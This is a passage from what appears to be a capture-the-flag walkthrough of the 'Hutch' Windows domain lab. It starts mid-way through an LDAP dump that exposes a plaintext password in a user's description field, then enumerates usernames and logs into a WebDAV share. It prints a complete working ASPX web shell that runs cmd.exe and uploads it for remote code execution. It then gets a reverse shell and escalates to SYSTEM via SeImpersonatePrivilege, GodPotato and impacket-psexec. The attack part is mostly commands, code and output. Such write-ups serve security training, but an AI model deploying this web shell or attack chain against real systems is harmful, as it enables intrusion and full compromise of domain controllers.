objectGUID:: PQ8QTFNtw0elgPkzWaOmHA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417057602730
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: agitthouse
sAMAccountType: 805306368
userPrincipalName: agitthouse@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132489437036308102
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132579563744834908
msDS-SupportedEncryptionTypes: 0

# Domain Administrator, Users, hutch.offsec
dn: CN=Domain Administrator,CN=Users,DC=hutch,DC=offsec

# search reference
ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 42
# numEntries: 38
# numReferences: 3
```
enumerating the ldap, we got lots of informations, let's make it detailed. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Hutch]
└─$ldapsearch-x-Hldap://192.168.154.122-b'DC=hutch,DC=offsec'|grep-isamaccountname|cut-d":"-f2
Guest
DomainComputers
CertPublishers
DomainUsers
DomainGuests
GroupPolicyCreatorOwners
RASandIASServers
AllowedRODCPasswordReplicationGroup
DeniedRODCPasswordReplicationGroup
EnterpriseRead-onlyDomainControllers
CloneableDomainControllers
ProtectedUsers
DnsAdmins
DnsUpdateProxy
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
```
cool we got clean usernames.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a1349fda-9695-46d8-b770-1c7adb7ebbb1)

cool we got a password and usernames. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/537736eb-d93c-4f11-91f6-18838cf6e68c)

we have access to smb, let's check if we can gain access to `winrm`. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Hutch]
└─$ sudo nxc winrm 192.168.154.122 -u fmcsorley -p CrabSharkJellyfish192 --continue-on-success
SMB         192.168.154.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
WINRM       192.168.154.122 5985   HUTCHDC          [-] hutch.offsec\fmcsorley:CrabSharkJellyfish192
```
we don't have access to `winrm`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ee1a5c66-9378-4864-aab0-64a6b0bb2ea2)

going back to the nmap scan, we can see a webdav server is running on port `80`. let's enumerate this. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Hutch]
└─$ cadaver 192.168.154.122
Authentication required for 192.168.154.122 on server `192.168.154.122':
Username: fmcsorley
Password: 
dav:/> ls
Listing collection `/': succeeded.
Coll:   aspnet_client                          0  Nov  4  2020
        iisstart.htm                         703  Nov  4  2020
        iisstart.png                       99710  Nov  4  2020
        index.aspx                          1241  Nov  4  2020
dav:/>
```
using `cadaver` to access the webdav server by logging in using the creds we got earlier, we can see we are in the default root dir of the webserver. let's put in an aspx web shell. 

```as
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```
aspx web shell. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ce33a95e-ef46-4299-b6f8-35b2c708d0b8)

uploaded the webshell. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/da8abcc5-8291-487a-86d0-a95beccb8ebd)

we can access the shell and also trigger an RCE. let's spawn reverse shell 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ab350cfb-1133-43e2-ac27-face0d1257ff)

we got a reverse shell.



## Privilege Escalation 


```powershell
PS C:\windows\system32\inetsrv> whoami 
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv>
```
checking user privs, we can see `SeImpersonatePrivilege` is enabled. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2b844f3b-ff8c-4d39-8b58-972ab2154a3c)

using godpotato.exe to change administrator password. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Hutch]
└─$ impacket-psexec Administrator@192.168.154.122                                                                           
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 192.168.154.122.....
[*] Found writable share ADMIN$
[*] Uploading file fQsYojmP.exe
[*] Opening SVCManager on 192.168.154.122.....
[*] Creating service VHfZ on 192.168.154.122.....
[*] Starting service VHfZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami 
nt authority\system

C:\Windows\system32> 
```
login psexec as administrator 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c61ecb4f-d7f2-4b7d-8c6a-caa2b869d3a5)

and we are through 🙂
